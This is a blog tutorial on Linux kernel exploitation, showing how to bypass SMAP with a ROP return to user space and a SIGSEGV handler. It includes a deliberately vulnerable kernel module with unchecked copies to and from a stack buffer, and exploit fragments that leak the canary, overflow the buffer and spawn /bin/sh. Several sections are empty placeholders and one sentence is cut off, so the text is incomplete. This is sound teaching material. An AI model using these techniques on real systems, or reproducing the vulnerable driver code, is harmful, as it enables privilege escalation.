+++
tags = ["linux","kernel"]
categories = ["Linux Kernel Exploitation"]
date = "2022-01-27"
description = "Bypassing supervisor mode access prevention (SMAP), a kernel exploit mitigation feature. Part four of a series of posts on Linux kernel exploitation techniques."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler"
slug = "linux-kernel-3-bypass-smep"
type = "post"
+++

## Table of Contents
 1. [Overview of Supervisor Mode Access Prevention](#overview-of-supervisor-mode-access-prevention)
 2. [SMAP Bypass Techniques](#smap-bypass-techniques)
 3. [A Vulnerable Kernel Module](#a-vulnerable-kernel-module)
 4. [Building a Complete Escalation Chain](#building-a-complete-escalation-chain)
 5. [Environment Setup](#environment-setup)
 6. [Building the Exploit](#building-the-exploit) 
 7. [Fixing the Exploit with a SIGSEGV Handler](#fixing-the-exploit-with-a-sigsegv-handler)


## Overview of Supervisor Mode Access Prevention
Supervisor mode access prevention (SMAP) is a kernel exploit mitigation feature that marks all user-space pages as non-accessible when the process is in kernel-space (slightly different to SMEP, as SMEP marks user-space pages as non-executable). This means that read/write access to user-space pages is disabled.

When used in combination with SMEP, it will remove read / write / execution permissions from all user-space pages. This can be a powerful way to mitigate kernel exploitation.

As we cannot read or write user-space memory, we'll have to find a different way to control process execution. We can (once again) do this via return-oriented programming (ROP).


## SMAP Bypass Techniques
Unlike SMEP, there isn't a straight-forward way to simply bypass SMAP. Instead, we'll have to craft a full exploit chain that replicates the return to user-space process. This way we'll be able to return to user-space and execute arbitrary code with elevated privileges.

Here are the steps we need to take in order to return to user-space via ROP chain:
 - Execute a `swapgs` instruction to swap the ensure the GS register corresponds to user-space.
 - Execute an `iret` instruction to restore our user-space registers.
 - Ensure that our `iret` frame is positioned correctly at the top of the stack.


## A Vulnerable Kernel Module
We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module ha.

For an overview of the vulnerabilities present in this kernel module, please read the post detailing the `ret2usr` technique.

{{< code language="c" title="challenge.c" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

char out[256];

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_to_user(buf, tmp, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_from_user(tmp, buf, len);
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
{{< /code >}}


## Building a Complete Escalation Chain
...


## Environment Setup
...


## Building the Exploit
...


## Fixing the Exploit with a SIGSEGV Handler
...

```c
void signal_handler(int signum)
{
    system("/bin/sh");
}
```

...

```c
int main(int argc, char **argv)
{
    save_user_space();

    /* register signal handler */
    signal(SIGSEGV, signal_handler);

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
```

...


## Appendix
 - [Learning Linux Kernel Exploitation - Part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)
 - [KSMASH - Kernel Stack Smashing](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)
